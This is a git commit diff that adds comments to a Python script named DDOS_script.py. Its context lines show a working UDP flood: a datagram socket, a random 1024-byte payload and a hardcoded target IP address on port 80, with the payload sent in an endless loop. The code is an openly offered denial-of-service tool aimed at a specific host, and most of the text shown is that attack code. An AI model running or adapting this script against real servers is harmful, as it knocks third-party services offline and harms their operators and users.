2775e261e84f1876b798d0eee68be9fa02e38b98
Lunastra <ln24630@gmail.com>
2021-04-22 19:06:16 -0700

    Add comment for DDOS_script.py file

--- DDOS/DDOS_script.py
+++ DDOS/DDOS_script.py
@@ -5,6 +5,7 @@ import socket
 import random
 import threading
 
+#Create a datagram and store a payload in it
 """ Create a datagram based server socket that uses IPv4 addressing scheme """
 datagramSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
 payload = random._urandom(1024);
@@ -12,6 +13,7 @@ payload = random._urandom(1024);
 #targetIP = input("Enter IP address of Target: ");
 #targetPort = input("Enter port of Target: ");
 
+#The IP of the server is provided along with the port number
 targetIP = "44.228.239.90";
 targetPort = 80;
 
@@ -20,6 +22,7 @@ os.system("DDOS Attack is Starting");
 
 packetIP = 0;
 
+#Keep sending datagram to the server IP through the provided port until interrupt by ctrl + c
 while True:
         datagramSocket.sendto(payload, (targetIP, targetPort));
 
